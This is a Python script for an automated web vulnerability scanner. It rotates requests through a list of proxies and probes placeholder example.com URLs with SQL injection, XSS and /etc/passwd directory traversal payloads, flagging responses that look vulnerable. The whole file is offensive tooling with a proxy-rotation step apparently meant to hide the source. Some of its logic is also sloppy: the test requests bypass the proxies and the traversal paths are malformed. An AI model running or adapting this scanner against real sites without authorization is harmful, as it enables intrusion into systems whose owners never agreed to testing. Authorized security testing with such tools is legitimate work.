import requests
import concurrent.futures
from itertools import cycle

# List of proxy IP addresses
proxy_list = [
    "192.168.0.1",
    "192.168.0.2",
    "192.168.0.3",
    # Add more proxy IP addresses here
]

# Create a cycle object to rotate through the proxy list
proxy_cycle = cycle(proxy_list)

# Function to send requests with rotated proxies
def send_request(url):
    proxy = next(proxy_cycle)
    proxies = {"http": proxy, "https": proxy}
    return requests.get(url, proxies=proxies)

# Example list of URLs to scan
urls = [
    "http://example.com/page1",
    "http://example.com/page2",
    "http://example.com/page3",
    # Add more URLs to scan here
]

# Payloads for SQL injection
sql_payloads = [
    "' OR '1'='1",
    "admin' --",
    # Add more SQL injection payloads here
]

# Payloads for XSS
xss_payloads = [
    "<script>alert('XSS')</script>",
    "<img src='x' onerror='alert(1)'>",
    # Add more XSS payloads here
]

# Payloads for directory traversal
dir_traversal_payloads = [
    "../etc/passwd",
    "../../etc/passwd",
    # Add more directory traversal payloads here
]

def scan_url(url):
    print(f"Scanning URL: {url}")
    try:
        response = send_request(url)
        if response.status_code == 200:
            # Vulnerability checks...
            for sql_payload in sql_payloads:
                test_url = f"{url}?param={sql_payload}"
                test_response = requests.get(test_url)
                if "error" in test_response.text:
                    print(f"Potential SQL injection vulnerability found: {test_url}")

            for xss_payload in xss_payloads:
                test_url = f"{url}?param={xss_payload}"
                test_response = requests.get(test_url)
                if xss_payload in test_response.text:
                    print(f"Potential XSS vulnerability found: {test_url}")

            for dir_traversal_payload in dir_traversal_payloads:
                test_url = f"{url}/../{dir_traversal_payload}"
                test_response = requests.get(test_url)
                if "root:" in test_response.text:
                    print(f"Potential directory traversal vulnerability found: {test_url}")
        else:
            print("Failed to retrieve URL:", url)
    except requests.exceptions.RequestException as e:
        print("Error occurred while scanning URL:", url)
        print("Error details:", str(e))
    print()

# Set the maximum number of concurrent requests
max_workers = 10

# Create a ThreadPoolExecutor
with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
    # Submit each URL for scanning
    futures = [executor.submit(scan_url, url) for url in urls]

    # Wait for all futures to complete
    concurrent.futures.wait(futures)
